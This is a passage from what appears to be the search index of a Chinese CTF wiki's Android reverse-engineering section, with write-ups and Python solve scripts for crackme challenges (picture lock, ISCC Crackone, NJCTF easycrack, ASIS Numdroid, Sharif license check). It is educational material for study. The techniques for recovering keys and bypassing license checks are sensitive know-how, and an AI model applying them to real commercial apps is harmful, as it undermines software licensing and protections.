\u7684\u8bdd\uff0c\u5c31\u5c06\u540e\u9762\u586b\u5145\u4e3a\u4e0d\u591f\u7684\u5927\u5c0f\uff08\u6bd4\u5982\u5927\u5c0f\u4e3a12\u65f6\uff0c\u586b\u5145 4 \u4e2a0x4\uff09 \u8fd9\u65f6\u4fee\u6539\u540e\u7684\u5185\u5bb9\u5fc5\u7136\u591f16\u4e2a\u5b57\u8282\uff0c\u5bf9\u524d16\u4e2a\u5b57\u8282\u8fdb\u884c AES \u52a0\u5bc6\u3002\u5bf9\u4e8e\u540e\u9762\u7684\u5b57\u8282\uff0c\u5c06\u5176\u4e0e md5sig[i%32]\u4f9d\u6b21\u8fdb\u884c\u5f02\u6216\u3002 \u65e2\u7136\u77e5\u9053\u52a0\u5bc6\u7b97\u6cd5\u540e\uff0c\u90a3\u5c31\u5f88\u5bb9\u6613\u9006\u4e86\uff0c\u6211\u4eec\u9996\u5148\u53ef\u4ee5\u83b7\u53d6\u7b7e\u540d\u7684 md5\uff0c\u5982\u4e0b \u279c picturelock keytool -list -printcert -jarfile picturelock.apk \u7b7e\u540d\u8005 #1: \u7b7e\u540d: \u6240\u6709\u8005: CN = a, OU = b, O = c, L = d, ST = e, C = ff \u53d1\u5e03\u8005: CN = a, OU = b, O = c, L = d, ST = e, C = ff \u5e8f\u5217\u53f7: 5f4e6be1 \u6709\u6548\u671f\u4e3a Fri Sep 09 14 :32:36 CST 2016 \u81f3 Tue Sep 03 14 :32:36 CST 2041 \u8bc1\u4e66\u6307\u7eb9: MD5: F8:C4:90:56:E4:CC:F9:A1:1E:09:0E:AF:47:1F:41:8D SHA1: 48 :E7:04:5E:E6:0D:9D:8A:25:7C:52:75:E3:65:06:09:A5:CC:A1:3E SHA256: BA:12:C1:3F:D6:0E:0D:EF:17:AE:3A:EE:4E:6A:81:67:82:D0:36:7F:F0:2E:37:CC:AD:5D:6E:86:87:0C:8E:38 \u7b7e\u540d\u7b97\u6cd5\u540d\u79f0: SHA256withRSA \u4e3b\u4f53\u516c\u5171\u5bc6\u94a5\u7b97\u6cd5: 2048 \u4f4d RSA \u5bc6\u94a5 \u7248\u672c: 3 \u6269\u5c55: #1: ObjectId: 2.5.29.14 Criticality=false SubjectKeyIdentifier [ KeyIdentifier [ 0000 : 71 A3 2A FB D3 F4 A9 A9 2A 74 3F 29 8E 67 8A EA q.*.....*t? ) .g.. 0010 : 3B DD 30 E3 ; .0. ] ] \u279c picturelock md5value = F8:C4:90:56:E4:CC:F9:A1:1E:09:0E:AF:47:1F:41:8D \u279c picturelock echo $md5value | sed 's/://g' | tr '[:upper:]' '[:lower:]' f8c49056e4ccf9a11e090eaf471f418d \u7ee7\u800c\uff0c\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u5df2\u6709\u7684 AES \u5e93\u6765\u8fdb\u884c\u89e3\u5bc6 #!/usr/bin/env python import itertools sig = 'f8c49056e4ccf9a11e090eaf471f418d' from Crypto.Cipher import AES def decode_sig ( payload ): ans = \"\" for i in range ( len ( payload )): ans += chr ( ord ( payload [ i ]) ^ ord ( sig [( 16 + i ) % 32 ])) return ans def dec_aes (): data = open ( 'flag.jpg.lock' , 'rb' ) . read () jpg_data = '' f = open ( 'flag.jpg' , 'wb' ) idx = 0 i = 0 cipher1 = AES . new ( sig [: 0x10 ]) cipher2 = AES . new ( sig [ 0x10 :]) while idx < len ( data ): read_len = ord ( sig [ i % 32 ]) payload = data [ idx : idx + read_len ] #print('[+] Read %d bytes' % read_len) print ( '[+] Totally %d / %d bytes, sig index : %d ' % ( idx , len ( data ), i )) if read_len % 2 == 0 : f . write ( cipher1 . decrypt ( payload [: 0x10 ])) else : f . write ( cipher2 . decrypt ( payload [: 0x10 ])) f . write ( decode_sig ( payload [ 16 :])) f . flush () idx += read_len i += 1 print ( '[+] Decoding done ...' ) f . close () dec_aes () \u6700\u540e\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2a\u56fe\u7247\u89e3\u5bc6\u540e\u7684\u7ed3\u679c\uff0c\u5176\u4e2d\u5c31\u5305\u542b flag \u4e86\u3002","title":"Android \u9759\u6001\u5206\u6790\u6df7\u5408\u4f8b\u5b50"},{"location":"android/basic_reverse/static/complex-example/#_1","text":"","title":"\u9759\u6001\u5206\u6790\u7efc\u5408\u9898\u76ee"},{"location":"android/basic_reverse/static/complex-example/#2017-iscc-crackone","text":"\u5229\u7528 jadx \u8fdb\u884c\u53cd\u7f16\u8bd1\uff0c\u53ef\u4ee5\u5f97\u5230\u7a0b\u5e8f\u7684\u57fa\u672c\u903b\u8f91\u5982\u4e0b \u5bf9\u7528\u6237\u8f93\u5165\u7684\u5185\u5bb9\u8fdb\u884c base64 \u7f16\u7801\uff0c\u7136\u540e\u5728\u6307\u5b9a\u957f\u5ea6\u4f4d\u7f6e\u5904\u63d2\u5165 \\r\\n \uff0c\u8fd9\u4e2a\u4f3c\u4e4e\u5e76\u6ca1\u6709\u4ec0\u4e48\u4e71\u7528\u3002 \u4e4b\u540e\u7a0b\u5e8f\u5c06\u7f16\u7801\u540e\u7684\u5185\u5bb9\u4f20\u9012\u7ed9 so \u4e2d\u7684 check \u51fd\u6570\u3002\u8fd9\u4e2a\u51fd\u6570\u7684\u903b\u8f91\u5982\u4e0b env = a1 ; len = plen ; str = pstr ; v7 = malloc ( plen ); (( * env ) -> GetByteArrayRegion )( env , str , 0 , len , v7 ); v8 = malloc ( len + 1 ); memset ( v8 , 0 , len + 1 ); memcpy ( v8 , v7 , len ); v9 = 0 ; for ( i = 0 ; ; ++ i ) { -- v9 ; if ( i >= len / 2 ) break ; v11 = v8 [ i ] - 5 ; v8 [ i ] = v8 [ len + v9 ]; v8 [ len + v9 ] = v11 ; } v8 [ len ] = 0 ; v12 = strcmp ( v8 , \"=0HWYl1SE5UQWFfN?I+PEo.UcshU\" ); free ( v8 ); free ( v7 ); return v12 <= 0 ; \u4e0d\u96be\u770b\u51fa\uff0c\u7a0b\u5e8f\u5c31\u662f\u76f4\u63a5\u5c06 base64 \u4e4b\u540e\u7684\u5b57\u7b26\u4e32\u7684\u4e24\u534a\u5206\u522b\u8fdb\u884c\u9002\u5f53\u7684\u64cd\u4f5c\uff0c\u8fd9\u91cc\u6211\u4eec\u5f88\u5bb9\u6613\u5199\u51fa python \u5bf9\u5e94\u7684\u6062\u590d\u4ee3\u7801\uff0c\u5982\u4e0b import base64 def solve (): ans = '=0HWYl1SE5UQWFfN?I+PEo.UcshU' length = len ( ans ) flag = [ 0 ] * length beg = 0 end = length while beg < length / 2 : end -= 1 flag [ beg ] = chr ( ord ( ans [ end ]) + 5 ) flag [ end ] = ans [ beg ] beg += 1 flag = '' . join ( flag ) print base64 . b64decode ( flag ) if __name__ == \"__main__\" : solve () \u5bf9\u5e94\u7684\u7ed3\u679c\u5982\u4e0b \u279c 2017ISCC python exp.py flag { ISCCJAVANDKYXX }","title":"2017 ISCC Crackone"},{"location":"android/basic_reverse/static/complex-example/#2017-njctf-easycrack","text":"\u901a\u8fc7\u7b80\u5355\u9006\u5411\uff0c\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u7684\u57fa\u672c\u903b\u8f91\u5982\u4e0b \u76d1\u63a7\u754c\u9762\u6587\u672c\u6846\uff0c\u5982\u679c\u6587\u672c\u6846\u5185\u5bb9\u6539\u53d8\u5219\u8c03\u7528 native parseText \u51fd\u6570\u3002 parseText \u7684\u4e3b\u8981\u529f\u80fd\u5982\u4e0b \u9996\u5148\u8c03\u7528 java \u5c42\u7684\u51fd\u6570 messageMe \u83b7\u53d6\u4e00\u4e2a\u5b57\u7b26\u4e32 mestr\u3002\u8fd9\u4e2a\u51fd\u6570\u7684\u903b\u8f91\u57fa\u672c\u662f \u4f9d\u6b21\u5c06 packagename \u7684\u6700\u540e\u4e00\u4e2a . \u540e\u9762\u7684\u5b57\u7b26\u4e32\u7684\u6bcf\u4e00\u4e2a\u4e0e 51\u8fdb\u884c\u5f02\u6216\uff0c\u5c06\u7ed3\u679c\u62fc\u63a5\u8d77\u6765\u3002 \u7136\u540e\u4ee5 mestr \u957f\u5ea6\u4e3a\u5468\u671f\uff0c\u5c06\u4e24\u8005\u8fdb\u884c\u5f02\u6216\uff0c\u6838\u5fc3\u903b\u8f91 str[i + j] = mestr[j] ^ iinput[i + j]; \u7ee7\u800c\u4e0b\u9762\u4ee5 I_am_the_key \u4e3a\u5bc6\u94a5\uff0c\u4f7f\u7528 RC4 \u52a0\u5bc6\u5bf9\u8be5\u90e8\u5206\u8fdb\u884c\u52a0\u5bc6\uff0c\u7136\u540e\u5c06\u7ed3\u679c\u4e0e\u6700\u540e\u7684 compare \u6bd4\u8f83\u3002\u8fd9\u91cc\u731c\u6d4b\u7684\u4f9d\u636e\u5982\u4e0b \u5728 init \u51fd\u6570\u4e2d\u6709 256 \u8fd9\u4e2a\u5173\u952e\u5b57\uff0c\u800c\u4e14\u57fa\u672c\u5c31\u662f RC4 \u5bc6\u94a5\u7684\u521d\u59cb\u5316\u8fc7\u7a0b\u3002 crypt \u51fd\u6570\u663e\u7136\u5c31\u662f\u4e00\u4e2a RC4 \u52a0\u5bc6\u51fd\u6570\uff0c\u660e\u663e\u5c31\u662f RC4 \u7684\u52a0\u5bc6\u903b\u8f91\u3002 \u89e3\u5bc6\u811a\u672c\u5982\u4e0b from Crypto.Cipher import ARC4 def messageme (): name = 'easycrack' init = 51 ans = \"\" for c in name : init = ord ( c ) ^ init ans += chr ( init ) return ans def decrypt ( cipher , key ): plain = \"\" for i in range ( 0 , len ( cipher ), len ( key )): tmp = cipher [ i : i + len ( key )] plain += '' . join ( chr ( ord ( tmp [ i ]) ^ ord ( key [ i ])) for i in range ( len ( tmp ))) return plain def main (): rc4 = ARC4 . new ( 'I_am_the_key' ) cipher = 'C8E4EF0E4DCCA683088134F8635E970EEAD9E277F314869F7EF5198A2AA4' cipher = '' . join ( chr ( int ( cipher [ i : i + 2 ], 16 )) for i in range ( 0 , len ( cipher ), 2 )) middleplain = rc4 . decrypt ( cipher ) mestr = messageme () print decrypt ( middleplain , mestr ) if __name__ == '__main__' : main () \u7ed3\u679c\u5982\u4e0b \u279c 2017NJCTF-easycrack python exp.py It_s_a_easyCrack_for_beginners \u279c 2017NJCTF-easycrack","title":"2017 NJCTF easycrack"},{"location":"android/basic_reverse/static/complex-example/#2018-picture-lock","text":"\u7b80\u5355\u5206\u6790\u4e4b\u540e\u53d1\u73b0\u8fd9\u662f\u4e00\u4e2a\u56fe\u7247\u52a0\u5bc6\u7a0b\u5e8f\uff1ajava \u5c42\u4e3a native \u5c42\u4f20\u5165 image/ \u4e0b\u7684\u7b2c\u4e00\u4e2a\u6587\u4ef6\u540d\uff0c\u4ee5\u53ca\u5e0c\u671b\u52a0\u5bc6\u540e\u7684\u56fe\u7247\u6587\u4ef6\u540d\uff0c\u5305\u62ec\u5bf9\u5e94\u7684 apk \u7684\u7b7e\u540d\u7684 md5\u3002 \u4e0b\u9762\u6211\u4eec\u5c31\u53ef\u4ee5\u5206\u6790 native \u5c42\u4ee3\u7801\uff0c\u7531\u4e8e\u7a0b\u5e8f\u5f88\u660e\u663e\u8bf4\u662f\u4e00\u4e2a\u52a0\u5bc6\u7a0b\u5e8f\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528IDA \u7684 findcrypto \u63d2\u4ef6\u6765\u8fdb\u884c\u8bc6\u522b\uff0c\u7ed3\u679c\u5374\u662f\u53d1\u73b0\u4e86 S \u76d2\uff0c\u800c\u4e14\u57fa\u672c\u4e0a\u5c31\u662f\u7b26\u5408 AES \u7684\u52a0\u5bc6\u6d41\u7a0b\u7684\uff0c\u6240\u4ee5\u53ef\u4ee5\u57fa\u672c\u786e\u5b9a\u7a0b\u5e8f\u7684\u4e3b\u4f53\u662f\u4e00\u4e2a AES \u52a0\u5bc6\uff0c\u7ecf\u8fc7\u7ec6\u81f4\u5206\u6790\u53ef\u4ee5\u53d1\u73b0 native \u5c42\u7a0b\u5e8f\u7684\u57fa\u672c\u6d41\u7a0b\u5982\u4e0b \u5c06\u4f20\u5165\u7684\u7b7e\u540d\u7684 md5 \u5b57\u7b26\u4e32\u5206\u4e3a\u4e24\u534a\uff0c\u751f\u6210\u4e24\u7ec4\u5bc6\u94a5\u3002 \u6bcf\u6b21\u8bfb\u5165md5sig[i%32]\u5927\u5c0f\u7684\u5185\u5bb9 \u6839\u636e\u8bfb\u5165\u7684\u5927\u5c0f\u51b3\u5b9a\u4f7f\u7528\u54ea\u4e00\u7ec4\u5bc6\u94a5 \u5947\u6570\u4f7f\u7528\u7b2c\u4e8c\u7ec4\u5bc6\u94a5 \u5076\u6570\u4f7f\u7528\u7b2c\u4e00\u7ec4\u5bc6\u94a5 \u5982\u679c\u8bfb\u5165\u7684\u5927\u5c0f\u4e0d\u591f 16 \u7684\u8bdd\uff0c\u5c31\u5c06\u540e\u9762\u586b\u5145\u4e3a\u4e0d\u591f\u7684\u5927\u5c0f\uff08\u6bd4\u5982\u5927\u5c0f\u4e3a12\u65f6\uff0c\u586b\u5145 4 \u4e2a0x4\uff09 \u8fd9\u65f6\u4fee\u6539\u540e\u7684\u5185\u5bb9\u5fc5\u7136\u591f16\u4e2a\u5b57\u8282\uff0c\u5bf9\u524d16\u4e2a\u5b57\u8282\u8fdb\u884c AES \u52a0\u5bc6\u3002\u5bf9\u4e8e\u540e\u9762\u7684\u5b57\u8282\uff0c\u5c06\u5176\u4e0e md5sig[i%32]\u4f9d\u6b21\u8fdb\u884c\u5f02\u6216\u3002 \u65e2\u7136\u77e5\u9053\u52a0\u5bc6\u7b97\u6cd5\u540e\uff0c\u90a3\u5c31\u5f88\u5bb9\u6613\u9006\u4e86\uff0c\u6211\u4eec\u9996\u5148\u53ef\u4ee5\u83b7\u53d6\u7b7e\u540d\u7684 md5\uff0c\u5982\u4e0b \u279c picturelock keytool -list -printcert -jarfile picturelock.apk \u7b7e\u540d\u8005 #1: \u7b7e\u540d: \u6240\u6709\u8005: CN = a, OU = b, O = c, L = d, ST = e, C = ff \u53d1\u5e03\u8005: CN = a, OU = b, O = c, L = d, ST = e, C = ff \u5e8f\u5217\u53f7: 5f4e6be1 \u6709\u6548\u671f\u4e3a Fri Sep 09 14 :32:36 CST 2016 \u81f3 Tue Sep 03 14 :32:36 CST 2041 \u8bc1\u4e66\u6307\u7eb9: MD5: F8:C4:90:56:E4:CC:F9:A1:1E:09:0E:AF:47:1F:41:8D SHA1: 48 :E7:04:5E:E6:0D:9D:8A:25:7C:52:75:E3:65:06:09:A5:CC:A1:3E SHA256: BA:12:C1:3F:D6:0E:0D:EF:17:AE:3A:EE:4E:6A:81:67:82:D0:36:7F:F0:2E:37:CC:AD:5D:6E:86:87:0C:8E:38 \u7b7e\u540d\u7b97\u6cd5\u540d\u79f0: SHA256withRSA \u4e3b\u4f53\u516c\u5171\u5bc6\u94a5\u7b97\u6cd5: 2048 \u4f4d RSA \u5bc6\u94a5 \u7248\u672c: 3 \u6269\u5c55: #1: ObjectId: 2.5.29.14 Criticality=false SubjectKeyIdentifier [ KeyIdentifier [ 0000 : 71 A3 2A FB D3 F4 A9 A9 2A 74 3F 29 8E 67 8A EA q.*.....*t? ) .g.. 0010 : 3B DD 30 E3 ; .0. ] ] \u279c picturelock md5value = F8:C4:90:56:E4:CC:F9:A1:1E:09:0E:AF:47:1F:41:8D \u279c picturelock echo $md5value | sed 's/://g' | tr '[:upper:]' '[:lower:]' f8c49056e4ccf9a11e090eaf471f418d \u7ee7\u800c\uff0c\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u5df2\u6709\u7684 AES \u5e93\u6765\u8fdb\u884c\u89e3\u5bc6 #!/usr/bin/env python import itertools sig = 'f8c49056e4ccf9a11e090eaf471f418d' from Crypto.Cipher import AES def decode_sig ( payload ): ans = \"\" for i in range ( len ( payload )): ans += chr ( ord ( payload [ i ]) ^ ord ( sig [( 16 + i ) % 32 ])) return ans def dec_aes (): data = open ( 'flag.jpg.lock' , 'rb' ) . read () jpg_data = '' f = open ( 'flag.jpg' , 'wb' ) idx = 0 i = 0 cipher1 = AES . new ( sig [: 0x10 ]) cipher2 = AES . new ( sig [ 0x10 :]) while idx < len ( data ): read_len = ord ( sig [ i % 32 ]) payload = data [ idx : idx + read_len ] #print('[+] Read %d bytes' % read_len) print ( '[+] Totally %d / %d bytes, sig index : %d ' % ( idx , len ( data ), i )) if read_len % 2 == 0 : f . write ( cipher1 . decrypt ( payload [: 0x10 ])) else : f . write ( cipher2 . decrypt ( payload [: 0x10 ])) f . write ( decode_sig ( payload [ 16 :])) f . flush () idx += read_len i += 1 print ( '[+] Decoding done ...' ) f . close () dec_aes () \u6700\u540e\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2a\u56fe\u7247\u89e3\u5bc6\u540e\u7684\u7ed3\u679c\uff0c\u5176\u4e2d\u5c31\u5305\u542b flag \u4e86\u3002","title":"2018 \u5f3a\u7f51\u676f picture lock"},{"location":"android/basic_reverse/static/java-example/","text":"\u9759\u6001\u5206\u6790 java \u5c42\u4f8b\u5b50 \u00b6 2014 tinyCTF Ooooooh! What does this button do \u00b6 \u786e\u5b9a\u6587\u4ef6\u7c7b\u578b \u00b6 \u901a\u8fc7linux\u7684file\u547d\u4ee4\u53ef\u4ee5\u770b\u51fa\u8be5\u6587\u4ef6\u662f\u4e00\u4e2a\u538b\u7f29\u5305\uff0c\u89e3\u538b\u6253\u5f00\u53d1\u73b0\u5b83\u5176\u5b9e\u662f\u4e00\u4e2aapk\u6587\u4ef6\u3002 \u5b89\u88c5apk \u00b6 \u5b89\u88c5\u6587\u4ef6\u4e4b\u540e\uff0c\u67e5\u770b\u4e00\u4e0b \u53ef\u4ee5\u770b\u51fa\u5176\u5c31\u662f\u8f93\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u7136\u540e\u5e94\u8be5\u4f1a\u5f39\u51fa\u7ed3\u679c\u3002 \u67e5\u770b\u7a0b\u5e8f \u00b6 class C00721 implements OnClickListener { C00721 () { } public void onClick ( View view ) { if ((( EditText ) MainActivity . this . findViewById ( C0073R . id . passwordField )). getText (). toString (). compareTo ( \"EYG3QMCS\" ) == 0 ) { MainActivity . this . startActivity ( new Intent ( MainActivity . this , FlagActivity . class )); } } } \u5728\u4e3b\u7a0b\u5e8f\u4e2d\uff0c\u53ef\u4ee5\u53d1\u73b0\uff0c\u5982\u679c\u6211\u4eec\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u4e3aEYG3QMCS\u5c31\u4f1a\u6267\u884cflagActivity.class\u3002\u90a3\u4e48\u6211\u4eec\u8f93\u5165\u4e00\u4e0b\uff0c\u53ef\u4ee5\u5f97\u5230\u5982\u4e0b\u7ed3\u679c \u5373\u5f97\u5230flag\u3002 2014 ASIS Cyber Security Contest Finals Numdroid \u00b6 \u5224\u65ad\u6587\u4ef6\u7c7b\u578b \u00b6 \u9996\u5148\u5229\u7528file\u5224\u65ad\u4e00\u4e0b\u6587\u4ef6\u7c7b\u578b\uff0c\u53d1\u73b0\u662f\u4e2a\u538b\u7f29\u5305\uff0c\u89e3\u538b\u7f29\u4e00\u4e0b\uff0c\u5f97\u5230\u5bf9\u5e94\u7684\u6587\u4ef6\uff0c\u7136\u540e\u7ee7\u7eed\u770b\u4e00\u4e0b\uff0c\u53d1\u73b0\u8be5\u6587\u4ef6\u662fapk\u6587\u4ef6\u3002 \u5b89\u88c5\u7a0b\u5e8f \u00b6 \u5b89\u88c5\u4e00\u4e0b\u7a0b\u5e8f\u3002\u7b80\u5355\u770b\u4e00\u4e0b\u9875\u9762\uff0c\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u4e3b\u8981\u662f\u8f93\u5165\u5bc6\u7801\uff0c\u7136\u540e\u767b\u9646\u3002\u5982\u679c\u8f93\u5165\u9519\u7684\u8bdd\u4f1a\u7206\u51fa\u201cWrong Password\u201d\u7684\u4fe1\u606f\u3002 \u5206\u6790\u7a0b\u5e8f \u00b6 \u6839\u636e\u76f8\u5e94\u7684\u5b57\u7b26\u4e32\u6765\u5b9a\u4f4d\u4e00\u4e0b\u6e90\u7a0b\u5e8f\u4e2d\u7684\u5173\u952e\u51fd\u6570\u3002\u6839\u636estrings.xml\u53ef\u4ee5\u53d1\u73b0\u8be5\u5b57\u7b26\u4e32\u7684\u53d8\u91cf\u540d\u4e3awrong\uff0c\u7ee7\u800c\u6211\u4eec\u627e\u5230\u4e86\u5982\u4e0b\u4ee3\u7801\u3002 protected void ok_clicked () { DebugTools . log ( \"clicked password: \" + this . mScreen . getText ()); boolean result = Verify . isOk ( this , this . mScreen . getText (). toString ()); DebugTools . log ( \"password is Ok? : \" + result ); if ( result ) { Intent i = new Intent ( this , LipSum . class ); Bundle b = new Bundle (); b . putString ( \"flag\" , this . mScreen . getText (). toString (). substring ( 0 , 7 )); i . putExtras ( b ); startActivity ( i ); return ; } Toast . makeText ( this , R . string . wrong , 1 ). show (); this . mScreen . setText ( \"\" ); } \u7ee7\u7eed\u5b9a\u4f4d\u5230Verify.isOk\u4e2d\u3002\u5982\u4e0b public static boolean isOk ( Context c , String _password ) { String password = _password ; if ( _password . length () > 7 ) { password = _password . substring ( 0 , 7 ); } String r = OneWayFunction ( password ); DebugTools . log ( \"digest: \" + password + \" => \" + r ); if ( r . equals ( \"be790d865f2cea9645b3f79c0342df7e\" )) { return true ; } return false ; } \u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u4e3b\u8981\u662f\u53d6password\u7684\u524d7\u4f4d\u8fdb\u884cOneWayFunction\u52a0\u5bc6\uff0c\u7136\u540e\u4e0ebe790d865f2cea9645b3f79c0342df7e\u8fdb\u884c\u6bd4\u8f83\u3002\u5982\u679c\u76f8\u7b49\u5c31\u4f1a\u8fd4\u56detrue\u3002\u8fd9\u91cc\u6211\u4eec\u518d\u770b\u4e00\u4e0bOneWayFunction\uff0c\u5982\u4e0b private static String OneWayFunction ( String password ) { List < byte []> bytes = ArrayTools . map ( ArrayTools . select ( ArrayTools . map ( new String []{ \"MD2\" , \"MD5\" , \"SHA-1\" , \"SHA-256\" , \"SHA-384\" , \"SHA-512\" }, new AnonymousClass1 ( password )), new SelectAction < byte []>() { public boolean action ( byte [] element ) { return element != null ; } }), new MapAction < byte [], byte []>() { public byte [] action ( byte [] element ) { int i ; byte [] b = new byte [ 8 ]; for ( i = 0 ; i < b . length / 2 ; i ++) { b [ i ] = element [ i ]; } for ( i = 0 ; i < b . length / 2 ; i ++) { b [( b . length / 2 ) + i ] = element [( element . length - i ) - 2 ]; } return b ; } }); byte [] b2 = new byte [( bytes . size () * 8 )]; for ( int i = 0 ; i < b2 . length ; i ++) { b2 [ i ] = (( byte []) bytes . get ( i % bytes . size ()))[ i / bytes . size ()]; } try { MessageDigest digest = MessageDigest . getInstance ( \"MD5\" ); digest . update ( b2 ); byte [] messageDigest = digest . digest (); StringBuilder hexString = new StringBuilder (); for ( byte aMessageDigest : messageDigest ) { String h = Integer . toHexString ( aMessageDigest & MotionEventCompat . ACTION_MASK ); while ( h . length () < 2 ) { h = \"0\" + h ; } hexString . append ( h ); } return hexString . toString (); } catch ( NoSuchAlgorithmException e ) { return \"\" ; } } \u51fd\u6570\u5927\u6982\u5c31\u662f\u6267\u884c\u4e86\u51e0\u4e2ahash\u503c\uff0c\u4f46\u662f\u81ea\u5df1\u53bb\u5206\u6790\u7684\u8bdd\uff0c\u592a\u8fc7\u4e8e\u590d\u6742\uff0c\uff0c\u7531\u4e8e\u672c\u9898\u7684\u7b54\u6848\u7a7a\u95f4( 10^7 10^7 )\u6bd4\u8f83\u5c0f\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u628averify\u7c7b\u4e2d\u7684\u65b9\u6cd5\u62ff\u51fa\u6765\u81ea\u5df1\u66b4\u529b\u8dd1\u4e00\u4e0b\u3002 \u6784\u9020\u7a0b\u5e8f \u00b6 \u63d0\u53d6\u51fajava\u7a0b\u5e8f\u4e4b\u540e\uff0c\u5728Verify\u7c7b\u4e2d\u6dfb\u52a0main\u51fd\u6570\u5e76\u4fee\u590d\u90e8\u5206\u9519\u8bef\uff0c\u4ece\u800c\u5f97\u5230\u5bf9\u5e94\u7684\u7b54\u6848\u3002 \u8fd9\u91cc\u5bf9\u5e94\u7684\u4ee3\u7801\u653e\u5728\u4e86example\u5bf9\u5e94\u7684\u6587\u4ef6\u5939\u4e2d\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u5982\u679c\u5bf9\u5e94\u7684hash\u51fd\u6570\u4e0d\u5b58\u5728\u7684\u8bdd\uff0c\u6e90\u7a0b\u5e8f\u4f1a\u8df3\u8fc7\u5bf9\u5e94\u7684\u51fd\u6570\u3002\u6211\u76f4\u63a5\u5168\u90e8\u8dd1\u6ca1\u6709\u627e\u5230\uff0c\u7136\u540e\u53bb\u6389\u4e86\u4e00\u4e2a\u4e0d\u5e38\u89c1\u7684MD2\u7b97\u6cd5\uff0c\u4ece\u800c\u5f97\u5230\u4e86\u7b54\u6848\u3002\u8fd9\u8bf4\u660eandroid\u5e94\u8be5\u662f\u6ca1\u6709md2\u7b97\u6cd5\u7684\u3002 \u8f93\u5165\u4e4b\u540e\u5f97\u5230\u5982\u4e0b \u7136\u540e\u6211\u4eec\u8ba1\u7b97\u5bf9\u5e94\u7684MD\u503c\uff0c\u4ece\u800c\u83b7\u5f97flag\u4e3aASIS_3c56e1ed0597056fef0006c6d1c52463\u3002 2014 Sharif University Quals CTF Commercial Application \u00b6 \u5b89\u88c5\u7a0b\u5e8f \u00b6 \u9996\u5148\uff0c\u5b89\u88c5\u7a0b\u5e8f\uff0c\u968f\u4fbf\u70b9\u4e86\u70b9\u6309\u94ae\uff0c\u5728\u53f3\u4e0a\u65b9\u70b9\u51fb\u6309\u94ae\u4f1a\u8ba9\u6211\u4eec\u8f93\u5165key \u968f\u4fbf\u8f93\u5165\u4e86\u4e0b\uff0c\u53d1\u73b0\u7a0b\u5e8f\u76f4\u63a5\u62a5\u9519\uff0c\u544a\u8bc9\u6211\u4eec\u4e0d\u5bf9\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u8fd9\u4e9b\u4fe1\u606f\u6765\u8fdb\u884c\u5b9a\u4f4d\u5173\u952e\u4ee3\u7801\u3002 \u5b9a\u4f4d\u5173\u952e\u4ee3\u7801 \u00b6 public static final String NOK_LICENCE_MSG = \"Your licence key is incorrect...! Please try again with another.\" ; public static final String OK_LICENCE_MSG = \"Thank you, Your application has full licence. Enjoy it...!\" ; private void checkLicenceKey ( final Context context ) { if ( this . app . getDataHelper (). getConfig (). hasLicence ()) { showAlertDialog ( context , OK_LICENCE_MSG ); return ; } View inflate = LayoutInflater . from ( context ). inflate ( C0080R . layout . propmt , null ); Builder builder = new Builder ( context ); builder . setView ( inflate ); final EditText editText = ( EditText ) inflate . findViewById ( C0080R . id . editTextDialogUserInput ); builder . setCancelable ( false ). setPositiveButton ( \"Continue\" , new OnClickListener () { public void onClick ( DialogInterface dialogInterface , int i ) { if ( KeyVerifier . isValidLicenceKey ( editText . getText (). toString (), MainActivity . this . app . getDataHelper (). getConfig (). getSecurityKey (), MainActivity . this . app . getDataHelper (). getConfig (). getSecurityIv ())) { MainActivity . this . app . getDataHelper (). updateLicence ( 2014 ); MainActivity . isRegisterd = true ; MainActivity . this . showAlertDialog ( context , MainActivity . OK_LICENCE_MSG ); return ; } MainActivity . this . showAlertDialog ( context , MainActivity . NOK_LICENCE_MSG ); } }). setNegativeButton ( \"Cancel\" , new C00855 ()); builder . create (). show (); } \u6211\u4eec\u53d1\u73b0\uff0c\u5176\u5b9e MainActivity.NOK_LICENCE_MSG\u5c31\u5b58\u50a8\u7740\u62a5\u9519\u7684\u5b57\u7b26\u4e32\u4fe1\u606f\uff0c\u518d\u7ee7\u7eed\u8bfb\u4e00\u4e0b\u53d1\u73b0\u7a0b\u5e8f\u4f7f\u7528 KeyVerifier . isValidLicenceKey ( editText . getText (). toString (), MainActivity . this . app . getDataHelper (). getConfig (). getSecurityKey (), MainActivity . this . app . getDataHelper (). getConfig (). getSecurityIv ()) \u6765\u8fdb\u884c\u9a8c\u8bc1\uff0c\u5982\u679c\u9a8c\u8bc1\u901a\u8fc7\u5c31\u4f1a\u8df3\u51fa\u6210\u529f\u4fe1\u606f\u3002 \u8be6\u7ec6\u5206\u6790 \u00b6 \u8fdb\u800c\u6211\u4eec\u4ed4\u7ec6\u5206\u6790\u4e00\u4e0b\u8fd9\u4e09\u4e2a\u53c2\u6570\u3002 \u53c2\u65701 \u00b6 \u53c2\u65701\u5176\u5b9e\u5c31\u662f\u6211\u4eec\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u3002 \u53c2\u65702 \u00b6 \u662f\u5229\u7528\u51fd\u6570\u6765\u83b7\u53d6getSecurityKey\uff0c\u6211\u4eec\u7b80\u5355\u9605\u8bfb\u4e00\u4e0b\uff0c\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u5728getConfig\u51fd\u6570\u4e2d\u8bbe\u7f6e\u4e86SecurityKey public AppConfig getConfig () { boolean z = false ; AppConfig appConfig = new AppConfig (); Cursor rawQuery = this . myDataBase . rawQuery ( SELECT_QUERY , null ); if ( rawQuery . moveToFirst ()) { appConfig . setId ( rawQuery . getInt ( 0 )); appConfig . setName ( rawQuery . getString ( 1 )); appConfig . setInstallDate ( rawQuery . getString ( 2 )); if ( rawQuery . getInt ( 3 ) > 0 ) { z = true ; } appConfig . setValidLicence ( z ); appConfig . setSecurityIv ( rawQuery . getString ( 4 )); appConfig . setSecurityKey ( rawQuery . getString ( 5 